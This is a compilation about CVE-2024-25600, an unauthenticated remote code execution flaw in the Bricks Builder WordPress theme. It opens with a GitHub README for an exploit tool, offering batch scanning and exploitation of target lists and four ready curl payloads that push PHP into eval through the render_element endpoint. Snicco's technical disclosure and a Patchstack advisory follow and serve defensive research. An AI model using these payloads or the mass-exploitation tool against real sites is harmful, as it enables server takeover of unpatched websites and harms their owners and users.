Unauthenticated Remote Code Execution ‚Äì Bricks <= 1.9.6

[snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6](https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6 "https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6")

[154
stars](/Chocapikk/CVE-2024-25600/stargazers) [33
forks](/Chocapikk/CVE-2024-25600/forks) [Branches](/Chocapikk/CVE-2024-25600/branches) [Tags](/Chocapikk/CVE-2024-25600/tags) [Activity](/Chocapikk/CVE-2024-25600/activity)
 [Star](/login?return_to=%2FChocapikk%2FCVE-2024-25600)

 [Notifications](/login?return_to=%2FChocapikk%2FCVE-2024-25600) You must be signed in to change notification settings

* [Code](/Chocapikk/CVE-2024-25600)
* [Issues
  0](/Chocapikk/CVE-2024-25600/issues)
* [Pull requests
  0](/Chocapikk/CVE-2024-25600/pulls)
* [Actions](/Chocapikk/CVE-2024-25600/actions)
* [Projects
  0](/Chocapikk/CVE-2024-25600/projects)
* [Security](/Chocapikk/CVE-2024-25600/security)
* [Insights](/Chocapikk/CVE-2024-25600/pulse)

Additional navigation options

* [Code](/Chocapikk/CVE-2024-25600)
* [Issues](/Chocapikk/CVE-2024-25600/issues)
* [Pull requests](/Chocapikk/CVE-2024-25600/pulls)
* [Actions](/Chocapikk/CVE-2024-25600/actions)
* [Projects](/Chocapikk/CVE-2024-25600/projects)
* [Security](/Chocapikk/CVE-2024-25600/security)
* [Insights](/Chocapikk/CVE-2024-25600/pulse)

# Chocapikk/CVE-2024-25600

   ¬†main[Branches](/Chocapikk/CVE-2024-25600/branches)[Tags](/Chocapikk/CVE-2024-25600/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit¬†History[15 Commits](/Chocapikk/CVE-2024-25600/commits/main/) | | |
| [README.md](/Chocapikk/CVE-2024-25600/blob/main/README.md "README.md") | | [README.md](/Chocapikk/CVE-2024-25600/blob/main/README.md "README.md") |  |  |
| [exploit.py](/Chocapikk/CVE-2024-25600/blob/main/exploit.py "exploit.py") | | [exploit.py](/Chocapikk/CVE-2024-25600/blob/main/exploit.py "exploit.py") |  |  |
| [requirements.txt](/Chocapikk/CVE-2024-25600/blob/main/requirements.txt "requirements.txt") | | [requirements.txt](/Chocapikk/CVE-2024-25600/blob/main/requirements.txt "requirements.txt") |  |  |
| View all files | | |

## Repository files navigation

* README
# CVE-2024-25600 Exploit Tool üöÄ

## Description üìù

This tool üõ†Ô∏è is designed to exploit the CVE-2024-25600 vulnerability üï≥Ô∏è found in the Bricks Builder plugin for WordPress. The vulnerability allows for unauthenticated remote code execution on affected websites üíª. The tool automates the exploitation process by retrieving nonces and sending specially crafted requests to execute arbitrary commands.

## Features üåü

* **Interactive Mode**: Engage with the target website in real-time üïπÔ∏è.
* **Batch Mode**: Scan and exploit multiple websites from a list üìã.
* **Command Execution**: Execute arbitrary commands on the target server ‚öôÔ∏è.
* **Payload Customization**: Choose between different payloads for exploitation, including `generic`, `carousel`, `container`, and `code` üß∞.
* **RCE Confirmation**: Option to display and record only URLs where RCE is confirmed ‚úîÔ∏è.

## Installation üõ†Ô∏è

1. Clone this repository to your local machine üñ•Ô∏è using `git clone`.
2. Navigate to the directory of the cloned repository.
3. Install the required Python libraries using `pip install -r requirements.txt`.

## Usage üìñ

### Interactive Mode üéÆ

1. Run the tool with `python exploit.py -u <URL>` to start interactive mode.
2. Follow the on-screen prompts to send commands to the target server.

### Batch Mode üìä

1. Prepare a text file with a list of target URLs.
2. Run the tool with `python exploit.py -l <file_path>` to scan and exploit the listed sites.
3. Use the `--only-rce` flag to display and record only URLs where RCE is confirmed.

### Payload Customization üß∞

* Use the `--payload-type` option followed by `generic`, `carousel`, `container`, or `code` to specify the type of payload for the exploit.

  Example: `python exploit.py -u <URL> --payload-type generic`

## Proof of Concept (PoC) üìù

The base PoCs provided by the disclosure are as follows:

**First PoC**:

```
curl -k -X POST https://[HOST]/wp-json/bricks/v1/render_element \
-H "Content-Type: application/json" \
-d '{
  "postId": "1",
  "nonce": "[NONCE]",
  "element": {
    "name": "container",
    "settings": {
      "hasLoop": "true",
      "query": {
        "useQueryEditor": true,
        "queryEditor": "throw new Exception(`id`);",
        "objectType": "post"
      }
    }
  }
}'
```

**Second PoC**:

```
curl -k -X POST https://[HOST]/wp-json/bricks/v1/render_element \
  -H "Content-Type: application/json" \
  -d '{
  "postId": "1",
  "nonce": "[NONCE]",
  "element": {
    "name": "carousel",
    "settings": {
      "type": "posts",
      "query": {
        "useQueryEditor": true,
        "queryEditor": "throw new Exception(`id`);",
        "objectType": "post"
      }
    }
  }
}'
```

**Third PoC** [Source](https://www.linkedin.com/feed/update/urn%3Ali%3Aactivity%3A7166462514099130368):

```
curl -k -X POST https://[HOST]/wp-json/bricks/v1/render_element \
  -H "Content-Type: application/json" \
  -d '{
  "postId": "1",
  "nonce": "[NONCE]",
  "element": "1",
  "loopElement": {
    "settings": {
      "query": {
        "useQueryEditor": "",
        "queryEditor": "throw new Exception(`id`);"
      }
    }
  }
}'
```

**Fourth PoC** (Effective on Older Versions):

```
curl -k -X POST "http://[HOST]/index.php?rest_route=/bricks/v1/render_element" \
-H "Content-Type: application/json" \
-d '{
  "postId": "1",
  "nonce": "[NONCE]",
  "element": {
    "name": "code",
    "settings": {
      "executeCode": "true",
      "code": "<?php throw new Exception(`id`);?>"
    }
  }
}'
```
> Note: The fourth PoC is particularly effective on older versions of Bricks Builder (tested on version 1.8), where previous PoCs may not work.

> It's possible that additional payloads could yield better results. If my exploit or proof of concept does not work for you, I encourage you to experiment with alternative payloads to find a more effective solution.

Replace `[HOST]` with the target website and `[NONCE]` with the nonce value retrieved from the site.

## Reference üìñ

For more information about the CVE-2024-25600 vulnerability, please refer to the detailed disclosure at [Snicco.io](https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6).

## Disclaimer ‚ö†Ô∏è

The information provided in this README is for educational purposes only. Unauthorized hacking into websites or networks is illegal and unethical. üö´

## Acknowledgements üôè

Kudos to the security researchers who discovered and reported this vulnerability, providing the community with information and tools to help secure their web applications.

## About

Unauthenticated Remote Code Execution ‚Äì Bricks <= 1.9.6

[snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6](https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6 "https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6")

### Resources

[Readme](#readme-ov-file)

[Activity](/Chocapikk/CVE-2024-25600/activity)
### Stars

[**154**
stars](/Chocapikk/CVE-2024-25600/stargazers)
### Watchers

[**3**
watching](/Chocapikk/CVE-2024-25600/watchers)
### Forks

[**33**
forks](/Chocapikk/CVE-2024-25600/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FChocapikk%2FCVE-2024-25600&report=Chocapikk+%28user%29)

## [Releases](/Chocapikk/CVE-2024-25600/releases)

No releases published

## [Packages 0](/users/Chocapikk/packages?repo_name=CVE-2024-25600)

No packages published

## Languages

* [Python
  100.0%](/Chocapikk/CVE-2024-25600/search?l=python)

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from snicco.io_165e403b_20250110_112606.html ===

# [snicco](https://snicco.io)

Taking the pain out of enterprise WordPress development

* [Vulnerability disclosures](https://snicco.io/vulnerability-disclosure)
* [Blog](https://snicco.io/blog)
* [Fortress](https://fortress.snicco.io)
* [Reach out](/cdn-cgi/l/email-protection#e3808c8d97828097a3908d8a80808ccd8a8c)
* + [GitHub](https://github.com/snicco)

Search

[snicco](https://snicco.io)

Taking the pain out of enterprise WordPress development

* [Vulnerability disclosures](https://snicco.io/vulnerability-disclosure)
* [Blog](https://snicco.io/blog)
* [Fortress](https://fortress.snicco.io)
* [Reach Out](/cdn-cgi/l/email-protection#89eae6e7fde8eafdc9fae7e0eaeae6a7e0e6)

Search

* [GitHub](https://github.com/snicco)
* [Mail](/cdn-cgi/l/email-protection#c7a4a8a9b3a6a4b387b4a9aea4a4a8e9aea8)

February 13, 2024
# Unauthenticated Remote Code Execution ‚Äì Bricks <= 1.9.6

Calvin Alkan

| in

[Bricks](https://snicco.io/vulnerability-disclosure/bricks)
[Broken Authentication](https://snicco.io/vulnerability-disclosure/classification/broken-authentication), [Injection](https://snicco.io/vulnerability-disclosure/classification/injection)

---

| Affected plugin | [Bricks Builder](https://bricksbuilder.io/) |
| --- | --- |
| Active installs | Commercial ~ 25000 |
| Vulnerable version | <= 1.9.6 |
| Audited version | 1.9.6 |
| Fully patched version | 1.9.6.1 |
| Recommended remediation | **Upgrade immediately** to version to 1.9.6.1 or higher |

## Description

---

Bricks <= 1.9.6 is vulnerable to unauthenticated remote code execution (RCE) which means that **anybody** can run arbitrary commands and take over the site/server.

## Proof of concept

---

**Note:**

This will be a long POC, you can [skip straight ahead to the demonstration](#demo).

This vulnerability is a bit more ‚Äúcomplex‚Äù, so we‚Äôll work our way from the inside out.

The Bricks\Query class is used to manage the rendering of WordPress post queries.

It contains the following vulnerable method:

```
public static function prepare_query_vars_from_settings( $settings = [], $fallback_element_id = '' )
{
    // CUT OUT FOR CLARITY

    $execute_user_code = function () use ( $php_query_raw ) {
        $user_result = null; // Initialize a variable to capture the result of user code

        // Capture user code output using output buffering
        ob_start();
        $user_result = eval( $php_query_raw ); // Execute the user code
        ob_get_clean(); // Get the captured output

        return $user_result; // Return the user code result
    };

    // CUT OUT FOR CLARITY
}
```

The critical part is Line 10 where $php\_query\_raw is passed to PHP‚Äôs [eval](https://www.php.net/manual/en/function.eval.php) function.

This function is extremely dangerous, and to be honest, should never be used.

![Image](https://snicco.io/wp-content/uploads/2024/02/image-1024x135.png)

To exploit this, we need to find a way to make Bricks call the above code with user controlled input for $php\_query\_raw.

The `prepare_query_vars_from_settings` method is always called in the constructor of the `Bricks\Query` class.

Unsurprisingly, this class is used and instantiated in numerous places.

![Image 1](https://snicco.io/wp-content/uploads/2024/02/image-1-1024x436.png)

It‚Äôs out of scope for us to check every single method call, but the one that stands out the immediately is: `Bricks\Ajax::render_element($element)`

Bricks uses it to display previews of blocks/elements inside the editor.

This method looks roughly like this (we removed irrelevant parts):

```
$loop_element = ! empty( $element['loopElement'] ) ? $element['loopElement'] : false;
$element      = $element['element'];

if ( ! empty( $loop_element ) ) {
    $query = new Query( $loop_element );

    // CUT FOR BREVITY
}

$element_name       = ! empty( $element['name'] ) ? $element['name'] : '';
$element_class_name = isset( Elements::$elements[ $element_name ]['class'] ) ? Elements::$elements[ $element_name ]['class'] : false;

if ( class_exists( $element_class_name ) ) {
    $element_instance = new $element_class_name( $element );
}
```

The method creates a new instance of Query with the supplied arguments and either creates a Query class directly on line 5.

Alternatively, any of Brick‚Äôs builder elements can also be created/rendered on line 14, by omitting the ‚Äú*loopElement*‚Äù argument and passing the ‚Äúname‚Äù of the element without the .php file.

Many of these element classes will also call new Query() downstream. There‚Äôs also a code element which can be used for this exploit, but in this write-up, we‚Äôll focus on the code path in line 5.

![Image 2](https://snicco.io/wp-content/uploads/2024/02/image-2.png)

The method is callable via the admin-ajax.php endpoint and the WordPress Rest API.

Furthermore, it contains the following permission check logic

```
if ( bricks_is_ajax_call() && isset( $_POST ) ) {
    self::verify_request();
}

elseif ( bricks_is_rest_call() ) {
    // REST API (Permissions checked in the API->render_element_permissions_check())
}
```

`Ajax::verify_request()` will check the current user has permissions to access the Bricks builder (sidenote: This is still not ideal since low privilege users might have [builder access](https://academy.bricksbuilder.io/article/builder-access/)).

However, if this method is called via the REST API, `Ajax::verify_request()` is not called.

The code comment:

> REST API (Permissions checked in the API->render\_element\_permissions\_check())

indicates that this check if performed inside the permission callback of WP‚Äôs rest API.

```
// Server-side render (SSR) for builder elements via window.fetch API requests
		register_rest_route(
			self::API_NAMESPACE,
			'render_element',
			[
				'methods'             => 'POST',
				'callback'            => [ $this, 'render_element' ],
				'permission_callback' => [ $this, 'render_element_permissions_check' ],
			]
		);
```

However, inspecting the *render\_element\_permission\_check* method, we can see that no permission checks are performed.

The method only checks if a request contains a valid nonce, and the WordPress docs clearly state that ‚Äú**nonces should never be relied on for authorization**‚Äú:

![Image 3](https://snicco.io/wp-content/uploads/2024/02/image-3.png)
```
public function render_element_permissions_check( $request ) {
    $data = $request->get_json_params();

    if ( empty( $data['postId'] ) || empty( $data['element'] ) || empty( $data['nonce'] ) ) {
        return new \WP_Error( 'bricks_api_missing', __( 'Missing parameters' ), [ 'status' => 400 ] );
    }

    $result = wp_verify_nonce( $data['nonce'], 'bricks-nonce' );

    if ( ! $result ) {
        return new \WP_Error( 'rest_cookie_invalid_nonce', __( 'Cookie check failed' ), [ 'status' => 403 ] );
    }

    return true;
}
```

So, the only left prerequisite is getting our hands on a valid nonce with the action ‚Äúbricks-nonce‚Äù.

Bricks will output a valid nonce for every request in the frontend, even if the user is not authenticated. This can be seen below in the rendered HTML of the site‚Äôs homepage.

There‚Äôs a script tag which contains a ‚Äú`bricksData`‚Äù object that, among other things, contains a valid nonce.

![Image 4](https://snicco.io/wp-content/uploads/2024/02/image-4.png)
### Demonstration

To conclude:

1. We have a valid nonce.
2. We can use that nonce to call a Brick rest API endpoint.
3. The endpoint will render any of Brick‚Äôs builder elements with our supplied input.
4. The supplied input will ultimately end up inside a call to PHP‚Äôs eval function, which can be used to run any random system command.

We won‚Äôt show the (complex) exploit script, but rather a demo ‚Äúthat it works‚Äù.

This is how our site looks before running the exploit:

![Bricks Before](https://snicco.io/wp-content/uploads/2024/02/bricks-before-1024x576.png)

After running the exploit, every page on the site looks like this and displays a static GIF.

## Proposed patch

---

It‚Äôs complicated to give a quick fix, since the functionality to `eval` user input is backed into several parts of the builder backend

In our opinion, `eval` should **NEVER** be used since ultimately, it always leads to something bad, and **it‚Äôs insecure by-design** to use it.

Of course, the quick win is adding the correct permission checks to the REST API endpoint. But that still leaves the dangerous functionality around, and it might very well be possible to call it via other means.

It should not be possible for anybody who‚Äôs not an admin (and preferable not even admins) to ever pass anything into `eval`.

At the bare minimum, the two instances in the codebase where Bricks uses `eval` (the Query class and the code block class) should be completely guarded against unauthorized, non admin-access, and the input must be heavily validated.

We‚Äôve also identified many places where data from the database flows into `eval` which is also not ideal since it means that anybody that can update the post\_meta table (possible via a low-impact vulnerability) will be able to inject system commands into the database which will then be passed to `eval`.

One solution for this could be storing a signature along with the code that‚Äôs to be evaluated using wp\_hash(). That way, at runtime, it can be assured that nobody has been able to inject code into the database.

## Timeline

---

| Vendor contacted | February 10, 2024 (Snicco contacts Bricks) |
| --- | --- |
| First Response | February 10, 2024 |
| Fully patched at | February 13, 2024 as per our recommendations. |
| Publicly disclosed | February 13, 2024 |
| Full disclosure of details | February 19, 2024 |

## Miscellaneous

---

The vendor has shown **exceptional** cooperation and fixed the vulnerability with our assistance in one working day (+ two weekend days) according to our recommendations.

## 6 responses

1. J
   [February 15, 2024](https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6#comment-348)

   Why was a public disclosure made so close to the patch being made available?

   [Reply](https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6?replytocom=348#respond)

   1. [Calvin Alkan](https://snicco.io)
      [February 16, 2024](https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6#comment-351)

      No idea what you mean, no details have been disclosed anywhere yet.

      [Reply](https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6?replytocom=351#respond)

      1. Bryant Grant
         [February 17, 2024](https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6#comment-357)

         Probably because your own timeline above clearly says, Publicly disclosed February 13, 2024.

         [Reply](https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6?replytocom=357#respond)

         1. [Calvin Alkan](https://snicco.io)
            [February 18, 2024](https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6#comment-361)

            Correct, the Bricks team published their release and announcement on the 13th (a couple of hours BEFORE us).

            Our page here does not give any further information besides what Bricks themselves published, so I don‚Äôt understand your point I guess?

            [Reply](https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6?replytocom=361#respond)
2. Terry Calop
   [February 16, 2024](https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6#comment-352)

   I‚Äôm pretty sure it is something in the download\_image method that‚Äôs causing the issue.

   [Reply](https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6?replytocom=352#respond)
3. Pudja Khan
   [February 17, 2024](https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6#comment-356)

   Very interesting vulnrability, i‚Äôm curious about the POC / Write up? is there any poc / write up about the vulnrability?

   [Reply](https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6?replytocom=356#respond)

### Leave a Reply [Cancel reply](/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6#respond)

Your email address will not be published. Required fields are marked \*

Comment \*

Name \*

Email \*

 Save my name, email, and website in this browser for the next time I comment.

---

[Audit Log Tampering through IP spoofing ‚Äì Stream <= 3.9.3](https://snicco.io/vulnerability-disclosure/xwp/stream)
[Remote Code Execution ‚Äì Cwicly <= 1.4.0.2](https://snicco.io/vulnerability-disclosure/cwicly/remote-code-execution-cwicly-1-4-0-2)

---

¬© 2023

[snicco](https://snicco.io)

Theme by [Anders Nor√©n](https://andersnoren.se)

Powered by [WordPress](https://wordpress.org)



=== Content from patchstack.com_1b1d8a4f_20250110_112605.html ===


[Pricing](https://patchstack.com/pricing/)
Solutions

[WordPress security

Instantly fix and mitigate vulnerabilities](https://patchstack.com/wordpress-security/)
[Plugin auditing

Paid auditing for WordPress vendors](https://patchstack.com/auditing/)
[Managed VDP

Start a security program for your plugin](https://patchstack.com/for-plugins/)
[Bug Bounty

Join the community and earn bounties](https://patchstack.com/bug-bounty/)
[Enterprise API

At scale monitoring and vPatching for hosts](https://patchstack.com/for-hosts/)
[Vulnerability database

The latest WordPress security intelligence](https://patchstack.com/database/)

[Login](https://app.patchstack.com/login)

[Start trial](https://app.patchstack.com/register?type=pro)

# WordPress Bricks Builder Theme <= 1.9.6 is vulnerable to Remote Code Execution (RCE)

![Patch priority: high](https://patchstack.com/database/img/priority-high.svg)

High priority

vPatch immediately

![Vulnerable version](https://patchstack.com/database/img/vulnerable_version.svg)

<= 1.9.6

Vulnerable version

![Fixed](https://patchstack.com/database/img/fix-available.svg)

1.9.6.1

Fixed version

[![](https://patchstack.com/database/img/platforms/WordPress.svg)](https://patchstack.com/database/wordpress/theme/bricks)

[![No VDP](https://patchstack.com/database/img/shield-grey.svg)
No VDP](https://patchstack.com/for-plugins/)

13 February 2024
by Patchstack

# Risks

CVSS 10

This vulnerability is highly dangerous and expected to become mass exploited.

##### 10

### Remote Code Execution (RCE)

This could allow a malicious actor to execute commands on the target website. This can be used to gain backdoor access to then take full control of the website.

This is a general description of this vulnerability type, specific impact varies case by case.
CVSS score is a way to evaluate and rank reported vulnerabilities in a standardized and repeatable way, but it is not ideal for CMSs.

![Alert](https://patchstack.com/database/img/exploited.svg)
### Known to be exploited!

# Solutions

We advise to mitigate or resolve the vulnerability immediately.

![Protect your website(s)](https://patchstack.com/database/img/shield-star.svg)
### Automatically mitigate vulnerabilities and keep your websites safe

Patchstack has issued a virtual patch to mitigate this issue by blocking any attacks until
you have updated to a fixed version.

#### Get the fastest vulnerability mitigation with Patchstack!

[Get Started](https://patchstack.com/pricing/)

![Update to version X or later](https://patchstack.com/database/img/update-checkmark.svg)
### Update to version 1.9.6.1 or later.

Update to version 1.9.6.1 or later to remove the vulnerability.

# Details

Software

Bricks Builder

Type

Theme

Vulnerable versions

<= 1.9.6

Fixed in

1.9.6.1

OWASP Top 10

A3: Injection

Classification

Remote Code Execution (RCE)

CVE

[CVE-2024-25600](https://www.cve.org/CVERecord?id=CVE-2024-25600)

Patch priority

High

CVSS severity

High
(10)

Developer

[Claim ownership](https://patchstack.com/for-plugins)

PSID

58c6c492a8d0

Credits

[![Snicco](https://patchstack.com/database/img/logomark-small.svg)](https://patchstack.com/database/researcher/fb2abcdf-8919-412d-b8c0-ecf6323a6fb5)

Required privilege

Unauthenticated

Published

13 February, 2024

[Vulnerability details](https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6)

![Remove and replace software](https://patchstack.com/database/img/expand.svg)
Expand full details

Have additional information or questions about this entry?
Let us know.

# Timeline

![Search icon](https://patchstack.com/database/img/search-green.svg)

Reported by

[![Snicco](https://patchstack-database.s3.us-east-2.amazonaws.com/researcher/240/snicco.png?X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIATLPOZUEKEA5CDFOJ%2F20250110%2Fus-east-2%2Fs3%2Faws4_request&X-Amz-Date=20250110T112604Z&X-Amz-SignedHeaders=host&X-Amz-Expires=604800&X-Amz-Signature=459e724a970cbc0ee127656ada976395175b2126d8c85997881e88447813f0e7)
Snicco](https://patchstack.com/database/researcher/fb2abcdf-8919-412d-b8c0-ecf6323a6fb5)

10 Feb 2024

![Early warning sent out](https://patchstack.com/database/img/warning.svg)

Early warning sent out to Patchstack customers

13 Feb 2024

![Published by Patchstack](https://patchstack.com/database/img/info.svg)

Published by Patchstack

15 Feb 2024

Go to

[![WordPress](https://patchstack.com/database/img/platforms/WordPress.svg)
Theme page](https://patchstack.com/database/wordpress/theme/bricks)

[![No VDP](https://patchstack.com/database/img/shield-grey.svg)
No VDP](https://patchstack.com/for-plugins/)

How can Patchstack provide the fastest protection?

Patchstack is one of the largest open-source vulnerability disclosers in the world. For example, in 2023 more than 70% of new WordPress vulnerabilities were originally published by Patchstack. This focus on research enables us to deploy vulnerability protection rules faster than anybody else.

What is virtual patching?

Patchstack vPatching auto-mitigates security vulnerabilities even when there's no official patch available. It's the fastest and most effective way to eliminate new security vulnerabilities without sacrificing performance.

Why would a hacker target my website?

Hackers automate attacks against new security vulnerabilities to take over as many websites as they can before users have time to patch and update. The attacks are opportunistic and victims are not chosen - everyone is a target.

What if my website has already been compromised?

We recommend reaching out to your hosting provider for server-side malware scanning or use a professional incident response service. Don't rely on plugin based malware scanners as they are commonly tampered with by malware.

# Weekly WordPress security intelligence delivered to your inbox.

![vPatch available](https://patchstack.com/database/img/envelope.svg)

Subscribe

### Website security

[Pricing](https://patchstack.com/pricing/)
[For WordPress](https://patchstack.com/wordpress-security/)
[For WooCommerce](https://patchstack.com/woocommerce-security/)
[For agencies](https://patchstack.com/for-agencies/)
[API For hosts](https://patchstack.com/for-hosts/)
[Documentation](https://docs.patchstack.com/)
[FAQ](https://patchstack.com/wordpress-security/)
[Log in](https://app.patchstack.com/login)

### For plugin devs

[Managed VDP](https://patchstack.com/for-plugins/)
[Log inNEW](https://vdp.patchstack.com/vdp/login)
[Active programs](https://patchstack.com/database/vdp/?page=1)
[Security auditing](https://patchstack.com/auditing/)

### For researchers

[Bug bounty](https://patchstack.com/bug-bounty/)
[Log inNEW](https://vdp.patchstack.com/researchers/login)
[Guidelines](https://patchstack.com/articles/bug-bounty-guidelines-rules/)
[LearnNEW](https://patchstack.com/academy/welcome/)
[Discord](https://discord.com/invite/rkE8yxtNmS)

### Resources

[Vulnerability Database](https://patchstack.com/database/)
[Whitepaper 2024](https://patchstack.com/whitepaper/state-of-wordpress-security-in-2024)
[WordPress StatisticsNEW](https://patchstack.com/database/statistics/wordpress)
[Case studiesNEW](https://patchstack.com/category/case-studies/)
[Articles](https://patchstack.com/articles/)

### Patchstack

[About](https://patchstack.com/about/)
[Careers](https://patchstack.com/about/#careers)
[AffiliatesNEW](https://patchstack.com/affiliates/)
[Merch store](https://store.patchstack.com/)
[Media kit](https://drive.google.com/drive/u/2/folders/1VlVbJnh8nBTVtJGvuo8KjAOgstBWxQ_W)

### Socials

[LinkedIn](https://www.linkedin.com/company/patchtsack/)
[Facebook](https://www.facebook.com/groups/patchstackcommunity/)
[X](https://twitter.com/patchstackapp)

¬© 2025 Patchstack
[DPA](https://patchstack.com/data-processing-agreement-dpa/)
[Privacy Policy](https://patchstack.com/privacy-policy/)
[Terms & Conditions](https://patchstack.com/terms-and-conditions/)
![EU Logo](https://patchstack.com/database/img/eic-logo.png)

![](https://patchstack.com/database/img/logo.svg)
### Website security

[Pricing](https://patchstack.com/pricing/)
[For WordPress](https://patchstack.com/wordpress-security/)
[For WooCommerce](https://patchstack.com/woocommerce-security/)
[For agencies](https://patchstack.com/for-agencies/)
[API For hosts](https://patchstack.com/for-hosts/)
[Documentation](https://docs.patchstack.com/)
[FAQ](https://patchstack.com/wordpress-security/)
[Log in](https://app.patchstack.com/login)

### For plugin devs

[Managed VDP](https://patchstack.com/for-plugins/)
[Log inNEW](https://vdp.patchstack.com/vdp/login)
[Active programs](https://patchstack.com/database/vdp/?page=1)
[Security auditing](https://patchstack.com/auditing/)

### For researchers

[Bug bounty](https://patchstack.com/bug-bounty/)
[Log inNEW](https://vdp.patchstack.com/researchers/login)
[Guidelines](https://patchstack.com/articles/bug-bounty-guidelines-rules/)
[LearnNEW](https://patchstack.com/academy/welcome/)
[Discord](https://discord.com/invite/rkE8yxtNmS)

### Resources

[Vulnerability Database](https://patchstack.com/database/)
[Whitepaper 2024](https://patchstack.com/whitepaper/state-of-wordpress-security-in-2024)
[WordPress StatisticsNEW](https://patchstack.com/database/statistics/wordpress)
[Case studiesNEW](https://patchstack.com/category/case-studies/)
[Articles](https://patchstack.com/articles/)

### Patchstack

[About](https://patchstack.com/about/)
[Careers](https://patchstack.com/about/#careers)
[AffiliatesNEW](https://patchstack.com/affiliates/)
[Merch store](https://store.patchstack.com/)
[Media kit](https://drive.google.com/drive/u/2/folders/1VlVbJnh8nBTVtJGvuo8KjAOgstBWxQ_W)

### Socials

[LinkedIn](https://www.linkedin.com/company/patchtsack/)
[Facebook](https://www.facebook.com/groups/patchstackcommunity/)
[X](https://twitter.com/patchstackapp)

![Mobile Menu](https://patchstack.com/database/img/close-menu-mob.png)

## Let us know if we have missed a vulnerability reported elsewhere

Report
![arrow right](https://patchstack.com/database/img/chevron-right.svg)

![Mobile Menu](https://patchstack.com/database/img/close-menu-mob.png)
[Close](https://patchstack.com/database/)
## reCAPTCHA's verification failed!

## Thank you for contributing!

[Close](https://patchstack.com/database/)
![Mobile Menu](https://patchstack.com/database/img/close-menu-mob.png)


